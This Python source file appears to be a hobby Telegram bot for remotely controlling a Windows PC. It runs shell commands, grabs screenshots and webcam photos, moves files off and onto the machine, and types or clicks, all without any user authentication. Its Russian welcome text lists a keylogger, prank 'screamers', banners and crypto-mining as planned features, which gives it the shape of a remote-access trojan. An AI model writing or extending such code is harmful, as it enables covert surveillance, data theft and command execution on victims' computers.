import pyautogui
import speech_recognition as sr
from pc_controller.sound import Sound
import pyscreenshot
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.types import ContentType
from aiogram.utils import executor
from config.config import TOKEN

from pc_remouter import RemoteManager

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

rm = RemoteManager(bot)


@dp.message_handler(commands=['start'])
async def process_start_command(message: types.Message):
    await message.reply(
        """Привет! Вот список моих комманд:
        /download 'file_name' - скачать файл из текущей директории
        Уже есть: 
            получение изображения с вебки
            Получение скриншота
            Выполнение комманд терминала
            Скачивание и загрузка файлов
        В планах:
            видео раб стола
            манипуляции с браузером
            скримеры (рекрол, смена раб стола, воспроизведение музыки)!!!
            кейлоггер
            изменение раб стола
            видео и звук с вебки
            баннеры
            тестирование
            перенос на другие оси
        В будущем: 
            майнинг""")


async def send_message(bot, id, text):
    while text:
        await bot.send_message(id, text[:4096])
        text = text[4096::]


@dp.message_handler(commands=['download'])
async def download(message: types.Message):
    try:
        command = message.text.split()
        content = open(command[1], 'rb')

        await message.reply_document(content)
    except Exception:
        await message.reply("Error in download file")


@dp.message_handler(commands=['.'])
async def exe(message: types.Message):
    command = message.text.split()[1::]
    await message.reply(rm.execute_command_console(command))


@dp.message_handler(commands=['screen'])
async def send_screenshot(msg: types.Message):
    image = pyscreenshot.grab()
    image.save("screen.png")

    await bot.send_photo(msg.from_user.id, types.InputFile('screen.png'))


@dp.message_handler(commands=['cam'])
async def send_cam(msg: types.Message):
    rm.make_cam_photo()

    await bot.send_photo(msg.from_user.id, types.InputFile('screen_camera.png'))


@dp.message_handler(commands=['o'])
async def get_video(msg: types.Message):
    # await rm.make_cam_video()

    # await msg.answer_video(open('video.avi', 'rb'))
    await msg.answer('1')


@dp.message_handler(commands='s')
async def say_text(msg: types.Message):
    await rm.say_text(msg.text[2:])


@dp.message_handler(commands='click')
async def mouse_left_click(msg: types.Message):
    pyautogui.click()


@dp.message_handler(commands='w')
async def write(msg: types.Message):
    pyautogui.typewrite(msg.text.split()[1])


@dp.message_handler(commands='v')
async def set_volume(msg: types.Message):
    try:
        Sound.volume_set(int(msg.text.split()[1]))
        await rm.say_text(f'Громкость звука установлена на {msg.text.split()[1]}%')
    except Exception:
        await msg.answer('Введите комманду в формате "/v x", где x - число от 0 до 100')


@dp.message_handler(content_types=[ContentType.VOICE])
async def voice_say(msg: types.Message):
    voice = msg.voice
    await voice.download()

    # path = rm.execute_command_console('cd')
    # path = path[:len(path) - 1:]
    #
    # path += '\\' + 'voice.mp3'

    await voice.download(destination_file=r'voice/voice.wav')

    # rate = 22050  # samples per second
    # T = 3  # sample duration (seconds)
    # f = 440.0  # sound frequency (Hz)
    # t = np.linspace(0, T, T * rate, endpoint=False)
    # x = np.sin(2 * np.pi * f * t)
    #
    # wavio.write('voice.wav', x, rate, sampwidth=2)

    # from scipy.io import wavfile
    #
    # samplerate = 44100
    # fs = 100
    # t = np.linspace(0., 1., samplerate)
    # amplitude = np.iinfo(np.int16).max
    # data = amplitude * np.sin(2. * np.pi * fs * t)
    #
    # y = (np.iinfo(np.int32).max * (data / np.abs(data).max())).astype(np.int32)
    #
    # wavfile.write("1.wav", samplerate, y)

    r = sr.Recognizer()
    with sr.AudioFile('voice/file_16.oga') as source:
        audio = r.record(source)

    print(r.recognize_google(audio, language='ru-RU'))


@dp.message_handler()
async def echo_message(msg: types.Message):
    command = str(msg.text).split()
    result = rm.execute(command)

    await send_message(bot, msg.from_user.id, result)


@dp.message_handler(content_types=[ContentType.DOCUMENT, ContentType.UNKNOWN])
async def upload(message: types.Message):
    try:
        file = message.document

        path = rm.execute_command_console('cd')
        path = path[:len(path) - 1:]

        path += '\\' + file.file_name

        await file.download(destination_file=path)
        await message.reply("Success")
    except Exception:
        await message.reply("Error in upload file")


if __name__ == '__main__':
    executor.start_polling(dp)
